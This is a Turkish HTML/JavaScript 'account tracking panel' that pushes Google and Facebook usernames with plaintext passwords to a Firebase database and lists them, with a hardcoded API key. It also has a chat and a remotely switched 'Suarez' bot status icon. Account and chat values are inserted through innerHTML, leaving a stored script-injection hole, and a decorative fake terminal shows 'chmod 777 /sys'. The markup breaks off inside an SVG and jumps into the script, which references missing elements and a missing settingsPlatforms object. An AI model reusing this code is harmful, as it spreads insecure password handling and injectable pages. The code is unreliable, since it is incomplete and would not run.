<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hesap Takip Paneli</title>
    <style>
        :root {
            --bg-color: #eef2f3;
            --panel-bg: #ffffff;
            --text-color: #111111;
            --accent-color: #5c67f2;
            --accent-hover: #3842bc;
            --border-color: #ddd;
            --box-shadow: 0 4px 15px rgba(0,0,0,0.1);
        }

        /* --- ÖZEL GÜN TEMALARI --- */
        body.theme-yilbasi {
            --bg-color: #0b1d3a;
            --panel-bg: #132746;
            --text-color: #f1f5f9;
            --accent-color: #e74c3c;
            --accent-hover: #c0392b;
            --border-color: #2c4a75;
            --box-shadow: 0 4px 20px rgba(231, 76, 60, 0.25);
        }
        body.theme-yilbasi .mesaj-kutusu { background: #19345e; color: #fff; border-left-color: #27ae60; }
        body.theme-yilbasi input, body.theme-yilbasi select { background: #0b1d3a; color: #fff; border-color: #2c4a75; }

        body.theme-cadilar {
            --bg-color: #120c1f;
            --panel-bg: #1f1435;
            --text-color: #f3e8ff;
            --accent-color: #e67e22;
            --accent-hover: #d35400;
            --border-color: #3b285c;
            --box-shadow: 0 4px 20px rgba(230, 126, 34, 0.3);
        }
        body.theme-cadilar .mesaj-kutusu { background: #2a1b48; color: #fff; border-left-color: #e67e22; }
        body.theme-cadilar input, body.theme-cadilar select { background: #120c1f; color: #fff; border-color: #3b285c; }

        body { font-family: 'Segoe UI', sans-serif; background: var(--bg-color); color: var(--text-color); padding: 15px; margin: 0; box-sizing: border-box; transition: background 0.3s ease; }
        .container { max-width: 450px; width: 100%; margin: auto; }

        /* Toast (Sağ Üst Bildirim) Tasarımı */
        #toastContainer { position: fixed; top: 15px; right: 15px; z-index: 99999; display: flex; flex-direction: column; gap: 8px; pointer-events: none; }
        .toast { background: #222; color: white; padding: 12px 18px; border-radius: 6px; font-size: 13px; box-shadow: 0 4px 15px rgba(0,0,0,0.25); opacity: 0; transform: translateY(-15px); transition: all 0.3s ease; pointer-events: auto; }
        .toast.show { opacity: 1; transform: translateY(0); }
        .toast.error { background: #ff4d4d; }
        .toast.success { background: #27ae60; }

        /* Tema Test Barı */
        .theme-selector-panel { background: var(--panel-bg); padding: 10px 15px; border-radius: 8px; margin-bottom: 15px; box-shadow: var(--box-shadow); display: flex; align-items: center; justify-content: space-between; font-size: 13px; border: 1px solid var(--border-color); }
        .theme-selector-panel select { width: 140px; margin: 0; padding: 6px; }

        /* Liste Alanları & Boş Durum Tasarımı */
        #dataList, #msgList { margin-bottom: 20px; max-height: 300px; overflow-y: auto; }
        .empty-state { text-align: center; padding: 25px 15px; background: var(--panel-bg); border-radius: 8px; color: #888; font-size: 13px; border: 2px dashed var(--border-color); box-shadow: 0 2px 5px rgba(0,0,0,0.02); display: flex; flex-direction: column; align-items: center; gap: 6px; }
        .empty-state svg { width: 28px; height: 28px; fill: #cbd5e1; }

        .mesaj-kutusu { background: var(--panel-bg); color: var(--text-color); padding: 15px; border-radius: 8px; margin-bottom: 10px; border-left: 5px solid var(--accent-color); display: flex; align-items: center; gap: 12px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
        .mesaj-kutusu.bot-mesaj { background: #f2e8f8; border-left-color: #d048f6; color: #111; }
        .mesaj-kutusu img { width: 30px; flex-shrink: 0; }
        .info { flex: 1; font-size: 14px; line-height: 1.6; word-break: break-all; }
        .del-btn { flex-shrink: 0; width: 50px; background: #ff4d4d; color: white; border: none; padding: 6px 10px; border-radius: 4px; cursor: pointer; font-size: 12px; }

        .panel { background: var(--panel-bg); color: var(--text-color); padding: 15px; border-radius: 12px; box-shadow: var(--box-shadow); margin-bottom: 20px; position: relative; border: 1px solid var(--border-color); }
        .logo-group { display: flex; gap: 10px; margin-bottom: 15px; }
        .platform-btn { flex: 1; padding: 10px; border: 2px solid var(--border-color); border-radius: 8px; cursor: pointer; text-align: center; transition: 0.3s; }
        .platform-btn img { width: 24px; vertical-align: middle; }
        .platform-btn.active { border-color: var(--accent-color); background: rgba(92, 103, 242, 0.1); }

        .input-row { display: flex; gap: 5px; flex-wrap: wrap; }
        .input-row input { flex: 1; min-width: 120px; }
        .input-row select { width: auto; flex-shrink: 0; }

        input, select { width: 100%; padding: 12px; margin: 6px 0; border: 1px solid var(--border-color); border-radius: 6px; box-sizing: border-box; font-size: 14px; background: var(--panel-bg); color: var(--text-color); }

        .btn-container { display: flex; gap: 8px; margin-top: 6px; flex-wrap: wrap; }
        .btn-container button { flex: 1; min-width: 90px; padding: 10px 6px; font-size: 12px; white-space: nowrap; }

        button { padding: 12px; background: var(--accent-color); color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; transition: background 0.2s; }
        button:hover { background: var(--accent-hover); }
        .multi-btn { background: #27ae60; }
        .multi-btn:hover { background: #219653; }
        .chat-input { display: flex; flex-direction: row; justify-content: center; align-items: center; gap: 5px; margin-top: 10px; }
        .chat-input input { margin: 0; }

        /* Sağ üst küçük sembol buton */
        .settings-toggle-btn {
            position: absolute;
            top: 15px;
            right: 15px;
            margin-top: 3px;
            background: linear-gradient(135deg, #ffffff, #f7f9fa);
            border: 1px solid #e1e8ed;
            color: #111;
            width: 38px;
            height: 38px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 0;
            z-index: 10;
            overflow: visible;
            border-radius: 8px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.06);
            transition: all 0.2s ease;
        }
        .settings-toggle-btn:hover {
            background-color: #f7f7fd;
            transform: scale(1.02);
            box-shadow: 0 3px 8px rgba(0,0,0,0.09);
        }

        /* SVG */
        .bot-svg {
            width: 22px;
            height: 22px;
            fill: #111111;
            transition: transform 0.3s ease;
            position: relative;
            z-index: 5;
        }

        .radar-dot {
            position: absolute;
            top: 6px;
            right: 6px;
            width: 5px;
            height: 5px;
            border-radius: 50%;
            display: none;
            z-index: 3;
        }

        /* --- 1. UYUYOR --- */
        .state-uyuyor .q-left_eye,
        .state-uyuyor .q-right_eye { display: none; }
        .state-uyuyor .bot-svg {
            fill: #111111;
            animation: sweet-sleep 3.5s infinite ease-in-out;
        }
        .zzz-container {
            position: absolute;
            top: -24px;
            right: 4px;
            pointer-events: none;
            display: none;
            z-index: 4;
        }
        .state-uyuyor .zzz-container { display: block; }
        .zzz {
            position: absolute;
            color: #8e44ad;
            font-weight: bold;
            font-size: 11px;
            opacity: 0;
            animation: rise-zzz 2.2s infinite linear;
        }
        .zzz:nth-child(2) { animation-delay: 0.7s; font-size: 13px; right: 6px; }
        .zzz:nth-child(3) { animation-delay: 1.4s; font-size: 15px; right: 12px; }

        @keyframes rise-zzz {
            0% { transform: translate(0, 0) scale(0.6); opacity: 0; }
            35% { opacity: 1; }
            100% { transform: translate(12px, -22px) scale(1.3); opacity: 0; }
        }
        @keyframes sweet-sleep {
            0%, 100% { transform: translateY(0) scale(1); }
            50% { transform: translateY(3px) scale(0.96) rotate(-3deg); }
        }

        /* --- 2. BEKLİYOR --- */
        .state-bekliyor .q-left_eye,
        .state-bekliyor .q-right_eye { display: block; }
        .state-bekliyor .bot-svg {
            fill: #111;
            animation: cute-bounce 1.4s infinite cubic-bezier(0.28, 0.84, 0.42, 1);
        }
        .popup-bubble {
            position: absolute;
            top: -38px;
            right: -10px;
            background: #000000;
            color: #ffffff;
            padding: 4px 9px;
            font-size: 10px;
            font-weight: 600;
            border-radius: 6px;
            white-space: nowrap;
            pointer-events: none;
            display: block;
            box-shadow: 0 3px 8px rgba(0,0,0,0.4);
            animation: pop-up-anim 2.8s ease-in-out;
            z-index: 5;
        }

        @keyframes pop-up-anim {
            0%, 100% { transform: translateY(6px) scale(0.7); opacity: 0; }
            15%, 85% { transform: translateY(0px) scale(1); opacity: 1; }
            95% { transform: translateY(-5px) scale(0.85); opacity: 0; }
        }
        @keyframes cute-bounce {
            0%, 100% { transform: translateY(0) scale(1); }
            40% { transform: translateY(-4px) scale(1.03); }
            70% { transform: translateY(0) scale(0.98); }
        }

        /* --- 3. ÇALIŞIYOR --- */
        .state-calisiyor .q-left_eye,
        .state-calisiyor .q-right_eye { display: block; }
        .state-calisiyor .bot-svg {
            fill: url(#purpleGradient);
            animation: happy-pulse 0.6s infinite alternate ease-in-out;
        }
        .state-calisiyor .radar-dot {
            display: block;
            background: url(#purpleGradient);
            background-color: #8e44ad;
            box-shadow: 0 0 6px rgba(142, 68, 173, 0.9);
            animation: blink-dot 0.5s infinite alternate;
        }
        @keyframes happy-pulse {
            0% { transform: scale(0.94) rotate(-2deg); }
            100% { transform: scale(1.06) rotate(2deg); }
        }
        @keyframes blink-dot {
            0% { opacity: 0.3; transform: scale(0.7); }
            100% { opacity: 1; transform: scale(1.4); }
        }

        /* --- 4. DONDU --- */
        .state-dondu {
            background: linear-gradient(135deg, rgba(135, 206, 250, 0.8), rgba(30, 144, 255, 0.6)) !important;
            border: 1px solid rgba(255, 255, 255, 0.9) !important;
            box-shadow: inset 0 0 10px rgba(255, 255, 255, 0.9), 0 0 12px rgba(0, 191, 255, 0.5) !important;
            filter: blur(0.2px);
        }
        .state-dondu::before {
            content: '';
            position: absolute;
            inset: 0;
            background: rgba(225, 245, 254, 0.3);
            z-index: 1;
            border-radius: 7px;
        }
        .state-dondu .bot-svg {
            fill: #ffffff !important;
            filter: drop-shadow(0 0 3px rgba(0, 180, 216, 0.9));
            animation: none !important;
            transform: none !important;
            z-index: 5;
        }

        .snow-container {
            position: absolute;
            inset: 0;
            pointer-events: none;
            display: none;
            z-index: 2;
            overflow: hidden;
            border-radius: 8px;
        }
        .state-dondu .snow-container { display: block; }
        .snowflake {
            position: absolute;
            background: #ffffff;
            border-radius: 50%;
            animation: fall-snow 1.5s infinite linear;
            box-shadow: 0 0 3px rgba(255, 255, 255, 0.9);
        }
        .snowflake:nth-child(1) { width: 3px; height: 3px; left: 6px; animation-duration: 1.1s; animation-delay: 0.2s; }
        .snowflake:nth-child(2) { width: 4px; height: 4px; left: 16px; animation-duration: 1.4s; animation-delay: 0.5s; }
        .snowflake:nth-child(3) { width: 2.5px; height: 2.5px; left: 26px; animation-duration: 0.9s; animation-delay: 0.1s; }
        .snowflake:nth-child(4) { width: 3.5px; height: 3.5px; left: 10px; animation-duration: 1.6s; animation-delay: 0.8s; }

        @keyframes fall-snow {
            0% { transform: translateY(-5px); opacity: 0; }
            20% { opacity: 1; }
            80% { opacity: 0.9; }
            100% { transform: translateY(38px); opacity: 0; }
        }

        .state-isinma {
            background: linear-gradient(135deg, #fff1f2, #ffe4e6) !important;
            border: 1px solid #fb7185 !important;
            box-shadow: inset 0 0 10px rgba(244, 63, 94, 0.2), 0 4px 15px rgba(244, 63, 94, 0.25) !important;
        }
        .state-isinma .q-left_eye,
        .state-isinma .q-right_eye { display: block; }
        .state-isinma .bot-svg {
            fill: #e11d48 !important;
            animation: heat-pulse 0.8s infinite alternate ease-in-out;
        }
        .heat-container {
            position: absolute;
            inset: 0;
            pointer-events: none;
            display: none;
            z-index: 2;
            overflow: hidden;
            border-radius: 12px;
        }
        .state-isinma .heat-container { display: block; }
        .heat-wave {
            position: absolute;
            background: rgba(255, 87, 87, 0.35);
            border-radius: 50%;
            filter: blur(4px);
            animation: rise-heat 1.6s infinite ease-out;
        }
        .heat-wave:nth-child(1) { width: 14px; height: 14px; left: 20px; bottom: 10px; animation-delay: 0s; }
        .heat-wave:nth-child(2) { width: 18px; height: 18px; right: 22px; bottom: 8px; animation-delay: 0.6s; }

        @keyframes rise-heat {
            0% { transform: translateY(0) scale(0.6); opacity: 0.8; }
            100% { transform: translateY(-40px) scale(1.6); opacity: 0; }
        }
        @keyframes heat-pulse {
            0% { transform: scale(0.97); }
            100% { transform: scale(1.03) rotate(1deg); }
        }
        .hot-badge{display: none}
        .state-isinma .hot-badge {
            display: block;
            position: absolute;
            top: -5px;
            right: -5px;
            background: #e11d48;
            color: #fff;
            width: 13px;
            height: 13px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 10px;
            font-weight: bold;
            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
            z-index: 6;
        }
        /* 6. KOD HATASI (KAYMASIZ, TAM OTURAN SHELL AKIŞI) */
        .state-hata {
            background: #030712 !important;
            border: 1px solid #064e3b !important;
            box-shadow: 0 0 15px rgba(0, 255, 65, 0.4) !important;
        }
        .matrix-container {
            position: absolute;
            inset: 0;
            pointer-events: none;
            display: none;
            z-index: 2;
            overflow: hidden;
            border-radius: 11px;
            opacity: 0.7;
        }
        .state-hata .matrix-container { display: flex; justify-content: flex-start; align-items: flex-start; }
        .terminal-stream {
            position: absolute;
            top: 0;
            width: 100%;
            color: #00ff41;
            font-family: 'Courier New', Courier, monospace;
            font-size: 5px;
            line-height: 7px;
            animation: full-terminal-scroll 1.8s infinite linear;
        }
        .state-hata .q-left_eye,
        .state-hata .q-right_eye { display: block; }
        .state-hata .bot-svg {
            fill: #00ff41 !important;
            filter: drop-shadow(0 0 5px rgba(0, 255, 65, 0.9));
            animation: glitch-anim 0.4s infinite alternate ease-in-out;
            z-index: 5;
        }

        @keyframes full-terminal-scroll {
            0% { transform: translateY(-50%); }
            100% { transform: translateY(0%); }
        }
        @keyframes glitch-anim {
            0% { transform: translate(0, 0) scale(1); }
            20% { transform: translate(-1px, 1px) scale(1.02); }
            40% { transform: translate(1px, -1px) scale(0.98); }
            60% { transform: translate(-1px, -1px) scale(1.01); }
            80% { transform: translate(1px, 1px) scale(0.99); }
            100% { transform: translate(0, 0) scale(1); }
        }

        /* 5. İNTERNET KOPMASI (5 ÇEKMEYEN ÇUBUK) */
        .state-kopuk {
            background: linear-gradient(135deg, #fff5f5, #fed7d7) !important;
            border: 1px solid #feb2b2 !important;
        }
        .state-kopuk .q-left_eye,
        .state-kopuk .q-right_eye { display: block; }
        .state-kopuk .bot-svg {
            fill: #e53e3e !important;
            animation: signal-shake 0.8s infinite ease-in-out;
        }
        .signal-container{display: none}
        .state-kopuk .signal-container {
            position: absolute;
            top: -12px;
            right: 0;
            display: flex;
            align-items: flex-end;
            gap: 2.5px;
            pointer-events: none;
            z-index: 6;
        }
        .signal-bar {
            width: 2px;
            background-color: #cbd5e1;
            border-radius: 2px;
            animation: signal-fade 1.2s infinite alternate ease-in-out;
        }
        .signal-bar:nth-child(1) { height: 3px; animation-delay: 0.1s; }
        .signal-bar:nth-child(2) { height: 6px; animation-delay: 0.2s; }
        .signal-bar:nth-child(3) { height: 9px; animation-delay: 0.3s; }
        .signal-bar:nth-child(4) { height: 11px; animation-delay: 0.4s; }
        .signal-bar:nth-child(5) { height: 14px; animation-delay: 0.5s; }

        @keyframes signal-fade {
            0%, 100% { opacity: 0.3; background-color: #cbd5e1; }
            50% { opacity: 0.9; background-color: #e53e3e; }
        }
        @keyframes signal-shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-1px) rotate(-1deg); }
            75% { transform: translateX(1px) rotate(1deg); }
        }

        .settings-content { display: none; margin-bottom: 15px; border-top: 1px solid var(--border-color); padding-top: 15px;  }
        .settings-content.open { display: block; }
        .master-toggle-row { display: flex; align-items: center; justify-content: space-between; margin-bottom: 10px; padding: 6px 10px; background: rgba(92, 103, 242, 0.1); border-radius: 6px; font-size: 13px; font-weight: bold; color: var(--accent-color); }
        .platform-toggle-grid { width: 100%; display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; }
        .toggle-item { display: flex; align-items: center; justify-content: space-between; padding: 8px 12px; border: 1px solid var(--border-color); border-radius: 6px; background: var(--panel-bg); font-size: 13px; }
        .toggle-item img { width: 18px; vertical-align: middle; margin-right: 5px; }
        .switch { position: relative; display: inline-block; width: 34px; height: 20px; }
        .switch input { opacity: 0; width: 0; height: 0; }
        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #ccc; transition: .3s; border-radius: 20px; }
        .slider:before { position: absolute; content: ""; height: 12px; width: 12px; left: 4px; bottom: 4px; background-color: white; transition: .3s; border-radius: 50%; }
        input:checked + .slider { background-color: #27ae60; }
        input:checked + .slider:before { transform: translateX(14px); }

        .avg-time-box { background: rgba(0,0,0,0.02); border: 1px dashed var(--border-color); padding: 10px; border-radius: 6px; margin-top: 12px; font-size: 12px; color: var(--text-color); }
    </style>
</head>

<div class="container">

    <h3 style="text-align: center;">Hesaplar (<span id="accCount">0</span>)</h3>
    <div id="dataList">
        <div class="empty-state">
            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
            <span>Henüz eklenen bir hesap bulunmuyor.</span>
        </div>
    </div>
    <div class="panel">
        <button id="toggleSettingsBtn" class="settings-toggle-btn" title="Ayarlar ve Suarez Durumu">
            <div class="zzz-container">
                <span class="zzz">z</span>
                <span class="zzz">Z</span>
                <span class="zzz">z</span>
            </div>
            <div class="snow-container">
                <span class="snowflake"></span>
                <span class="snowflake"></span>
                <span class="snowflake"></span>
                <span class="snowflake"></span>
            </div>
            <div class="hot-badge">~</div>
            <div class="heat-container">
                <span class="heat-wave"></span>
                <span class="heat-wave"></span>
                <span class="heat-wave"></span>
            </div>
            <div class="matrix-container">
                <div class="terminal-stream">
                    $ sudo start core
                    > init kernel v6.4
                    [OK] mounted fs
                    > parsing cfg/env
                    ERR: null ref
                    > trace: 0x00FF41
                    > dumping stack
                    $ chmod 777 /sys
                    > flush cache
                    $ sudo start core
                    > init kernel v6.4
                    [OK] mounted fs
                    > parsing cfg/env
                    ERR: null ref
                    > trace: 0x00FF41
                    > dumping stack
                    $ chmod 777 /sys
                    $ sudo start core
                    > init kernel v6.4
                </div>
            </div>
            <div class="signal-container">
                <span class="signal-bar"></span>
                <span class="signal-bar"></span>
                <span class="signal-bar"></span>
                <span class="signal-bar"></span>
                <span class="signal-bar"></span>
            </div>
            <div class="radar-dot"></div>
            <div class="popup-bubble" id="popupMsg" style="display:none;">Hadi artık!</div>
            <svg class="bot-svg" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                <defs>
                    <linearGradient id="purpleGradient" x1="0%" y1="0%" x2="100%" y2="100%">
                        <stop offset="0%" stop-color="#8e44ad" />
                        <stop offset="50%" stop-color="#9b59b6" />
                        <stop offset="100%" stop-color="#6c5ce7" />

<script id="engine-script" type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
    import { getDatabase, ref, push, onChildAdded, onValue, remove, onChildRemoved, set } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";

    window.getDatabase = getDatabase;
    window.ref = ref;
    window.push = push;
    window.set = set;
    window.onChildAdded = onChildAdded;
    window.onValue = onValue;
    window.remove = remove;
    window.onChildRemoved = onChildRemoved;
    window.initializeApp = initializeApp;

    // Toast Bildirim Sistemi (Alert yerine)
    window.showToast = function(message, type = 'success') {
        const container = document.getElementById('toastContainer');
        const toast = document.createElement('div');
        toast.className = `toast ${type}`;
        toast.innerText = message;
        container.appendChild(toast);

        setTimeout(() => toast.classList.add('show'), 10);
        setTimeout(() => {
            toast.classList.remove('show');
            setTimeout(() => toast.remove(), 300);
        }, 3000);
    }

    window.changeTheme = function(themeName) {
        document.body.className = '';
        if (themeName !== 'normal') {
            document.body.classList.add(`theme-${themeName}`);
            showToast(`${themeName.toUpperCase()} teması aktif!`, 'success');
        } else {
            showToast("Normal temaya dönüldü.", 'success');
        }
    }

    function triggerSpecialTheme() {
        const today = new Date();
        const month = today.getMonth() + 1;
        const day = today.getDate();

        if (month === 10 && day === 31) {
            if (typeof window.changeTheme === 'function') {
                window.changeTheme('cadilar');
            }
        } else if ((month === 12 && day >= 15) || (month === 1 && day <= 2)) {
            if (typeof window.changeTheme === 'function') {
                window.changeTheme('yilbasi');
            }
        }
    }

    document.addEventListener('DOMContentLoaded', triggerSpecialTheme);

    const firebaseConfig = {
        apiKey: "AIzaSyBV7jtoXPBcPdclcBseOK39wJsSXUxLpg4",
        databaseURL: "https://atamossocket-default-rtdb.firebaseio.com",
        projectId: "atamossocket"
    };
    const db = getDatabase(initializeApp(firebaseConfig));
    const dataRef = ref(db, 'hesaplar');
    const msgRef = ref(db, 'mesajlar');
    const settingsRef = ref(db, 'ayarlar/platformlar');
    window.botRef = ref(db, 'suarez/action');
    window.botPopRef = ref(db, 'suarezPop');

    onValue(window.botRef, (snapshot) => {
        const val = snapshot.val();
        if (!val) {
            set(window.botRef, 'uyuyor');
        } else {
            updateBotIconState(val);
        }
    });

    const waitingPhrases = ["Sıkıldım!", "Hadi artık", "Biz hazırız", "Bekliyorum..."];
    let popupTimer = null;

    function showPopupText(text, shouldDeleteKey = null) {
        const popupEl = document.getElementById('popupMsg');
        popupEl.innerText = text;
        popupEl.style.display = 'block';
        popupEl.style.animation = 'none';
        popupEl.offsetHeight;
        popupEl.style.animation = 'pop-up-anim 3s ease-in-out';

        setTimeout(() => {
            popupEl.style.display = 'none';
            if (shouldDeleteKey) {
                remove(ref(db, `suarezPop/${shouldDeleteKey}`));
            }
        }, 3000);
    }

    function updateBotIconState(action) {
        const btn = document.getElementById('toggleSettingsBtn');
        btn.classList.remove('state-uyuyor', 'state-bekliyor', 'state-calisiyor', 'state-dondu', 'state-isinma','state-hata','state-kopuk');

        if (popupTimer) {
            clearTimeout(popupTimer);
            popupTimer = null;
        }

        const act = (action || 'uyuyor').toLowerCase();
        if (act.includes('uyuyor') || act.includes('passive')) {
            btn.classList.add('state-uyuyor');
            document.getElementById('popupMsg').style.display = 'none';
        } else if (act.includes('bekliyor')) {
            btn.classList.add('state-bekliyor');
            startRandomizedWaitingPopups();
        } else if (act.includes('çalışıyor') || act.includes('calisiyor') || act.includes('aktif')) {
            btn.classList.add('state-calisiyor');
            document.getElementById('popupMsg').style.display = 'none';
        } else if (act.includes('dondu') || act.includes('buz') || act.includes('freeze')) {
            btn.classList.add('state-dondu');
            document.getElementById('popupMsg').style.display = 'none';
        }else if (act.includes('ısınma') || act.includes('thermodynamics') || act.includes('isinma')) {
            btn.classList.add('state-isinma');
            document.getElementById('popupMsg').style.display = 'none';
        }
        else if (act.includes('code')) {
            btn.classList.add('state-hata');
            document.getElementById('popupMsg').style.display = 'none';
        }
        else if (act.includes('wifi')) {
            btn.classList.add('state-kopuk');
            document.getElementById('popupMsg').style.display = 'none';
        }
        else {
            btn.classList.add('state-uyuyor');
        }
    }
    // set(window.botRef, 'code');

    function startRandomizedWaitingPopups() {
        const triggerPopup = () => {
            const randomText = waitingPhrases[Math.floor(Math.random() * waitingPhrases.length)];
            showPopupText(randomText);

            const nextInterval = (Math.floor(Math.random() * 6) + 5) * 1000;
            popupTimer = setTimeout(triggerPopup, nextInterval);
        };
        triggerPopup();
    }

    onChildAdded(window.botPopRef, (data) => {
        const val = data.val();
        if (val) {
            const textContent = typeof val === 'object' ? val.text : val;
            if (textContent) {
                showPopupText(textContent, data.key);
            }
        }
    });

    document.getElementById('toggleSettingsBtn').onclick = () => {
        document.getElementById('settingsPanel').classList.toggle('open');
    };

    window.togglePlatformStatus = (p, status) => {
        settingsPlatforms[p].active = status;
        set(ref(db, `ayarlar/platformlar/${p}`), status);
        checkMasterToggleState();
        updateAverageTimeUI();
    };

    window.toggleAllPlatforms = (status) => {
        for (let p in settingsPlatforms) {
            settingsPlatforms[p].active = status;
            set(ref(db, `ayarlar/platformlar/${p}`), status);
        }
        renderSettingsUI();
        updateAverageTimeUI();
    };

    function checkMasterToggleState() {
        const allKeys = Object.keys(settingsPlatforms);
        const allActive = allKeys.every(k => settingsPlatforms[k].active);
        document.getElementById('masterToggle').checked = allActive;
    }

    function updateAverageTimeUI() {
        const activePlatforms = Object.keys(settingsPlatforms).filter(k => settingsPlatforms[k].active);
        const container = document.getElementById('avgTimeList');

        if (activePlatforms.length === 0) {
            container.innerHTML = '<b style="color:#ff4d4d;">Aktif platform yok!</b>';
            return;
        }

        const baseMinutes = 10;
        const addMinutes = activePlatforms.reduce((sum, p) => {
            const minVal = settingsPlatforms[p].minutes;
            return sum + (typeof minVal === 'number' ? minVal : (Math.floor(Math.random() * 3) + 1));
        }, 0);
        const totalMinutes = baseMinutes + addMinutes;

        container.innerHTML = `<b style="color:#27ae60;">${totalMinutes} dakika</b>`;
    }

    function renderSettingsUI() {
        const toggleGrid = document.getElementById('platformToggleGrid');
        toggleGrid.innerHTML = '';
        for (let p in settingsPlatforms) {
            const data = settingsPlatforms[p];
            const item = document.createElement('div');
            item.className = 'toggle-item';
            item.innerHTML = `
                <span><img src="${data.logo}">${p}</span>
                <label class="switch">
                    <input type="checkbox" ${data.active ? 'checked' : ''} onchange="togglePlatformStatus('${p}', this.checked)">
                    <span class="slider"></span>
                </label>
            `;
            toggleGrid.appendChild(item);
        }
        checkMasterToggleState();
        updateAverageTimeUI();
    }

    onValue(settingsRef, (snapshot) => {
        const val = snapshot.val();
        if (val) {
            for (let p in val) {
                if (settingsPlatforms[p]) {
                    settingsPlatforms[p].active = val[p];
                }
            }
        } else {
            for (let p in settingsPlatforms) {
                set(ref(db, `ayarlar/platformlar/${p}`), settingsPlatforms[p].active);
            }
        }
        renderSettingsUI();
    });

    onValue(dataRef, (snapshot) => {
        document.getElementById('accCount').innerText = snapshot.size || 0;
    });

    window.selectPlatform = (p) => {
        document.getElementById('selectedPlatform').value = p;
        document.getElementById('btnGoogle').className = p === 'Google' ? 'platform-btn active' : 'platform-btn';
        document.getElementById('btnFacebook').className = p === 'Facebook' ? 'platform-btn active' : 'platform-btn';
    };

    document.getElementById('sendBtn').onclick = () => {
        const u = document.getElementById('usernameInput').value;
        const d = document.getElementById('domainSelect').value;
        const p = document.getElementById('passwordInput').value;
        if(!u || !p) return showToast("Alanları boş bırakma!", "error");
        push(dataRef, { platform: document.getElementById('selectedPlatform').value, user: u + d, pass: p, time: new Date().toLocaleTimeString() });
        showToast("Hesap başarıyla eklendi.", "success");
        document.getElementById('usernameInput').value = '';
        document.getElementById('passwordInput').value = '';
    };

    document.getElementById('sendMultiBtn').onclick = () => {
        const u = document.getElementById('usernameInput').value;
        const d = document.getElementById('domainSelect').value;
        const p = document.getElementById('passwordInput').value;
        if(!u || !p) return showToast("Alanları boş bırakma!", "error");
        push(dataRef, { platform: 'Google', user: u + d, pass: p, time: new Date().toLocaleTimeString() });
        push(dataRef, { platform: 'Facebook', user: u + d, pass: p, time: new Date().toLocaleTimeString() });
        showToast("Hesaplar her iki platforma da eklendi.", "success");
        document.getElementById('usernameInput').value = '';
        document.getElementById('passwordInput').value = '';
    };

    document.getElementById('sendChatBtn').onclick = () => {
        let msg = document.getElementById('chatMsg').value.trim();
        if(!msg) return;

        let isBot = false;
        if (msg.startsWith('/bot') || msg.startsWith('/suarez')) {
            isBot = true;
            msg = msg.replace('/bot', '').replace('/suarez', '').trim();
        }

        if(!msg) return;
        push(msgRef, { text: msg, isBot: isBot, time: new Date().toLocaleTimeString() });
        document.getElementById('chatMsg').value = '';
    };

    onChildAdded(dataRef, (data) => {
        const list = document.getElementById('dataList');
        const emptyState = list.querySelector('.empty-state');
        if (emptyState) emptyState.remove();

        const v = data.val();
        const logo = v.platform === 'Google' ? 'https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg' : 'https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg';
        const div = document.createElement('div');
        div.className = 'mesaj-kutusu';
        div.id = data.key;
        div.innerHTML = `
        <img src="${logo}">
        <div class="info">
            <strong quasar-platform="${v.platform}">${v.platform}</strong><br>
            <span class="q-userName">${v.user}</span><br>
            <span class="q-password">${v.pass}</span>
        </div>
        <button class="del-btn" onclick="removeData('${data.key}')">Sil</button>
    `;
        const oldFirst = list.querySelector('.first-item');
        if (oldFirst) oldFirst.classList.remove('first-item');
        div.classList.add('first-item');
        list.prepend(div);
    });

    onChildRemoved(dataRef, (data) => {
        const element = document.getElementById(data.key);
        if (element) {
            element.remove();
        }
        const list = document.getElementById('dataList');
        if (list.children.length === 0) {
            list.innerHTML = `
                <div class="empty-state">
                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
                    <span>Henüz eklenen bir hesap bulunmuyor.</span>
                </div>
            `;
        }
    });

    onChildAdded(msgRef, (data) => {
        const list = document.getElementById('msgList');
        const emptyState = list.querySelector('.empty-state');
        if (emptyState) emptyState.remove();

        const val = data.val();
        const div = document.createElement('div');
        div.className = val.isBot ? 'mesaj-kutusu bot-mesaj' : 'mesaj-kutusu';
        if (!val.isBot) div.style.borderLeftColor = '#27ae60';

        const prefix = val.isBot ? '<strong>[Suarez]:</strong> ' : '';
        div.innerHTML = `<div class="info">${prefix}${val.text} <br><small>${val.time}</small></div>`;
        list.prepend(div);
    });
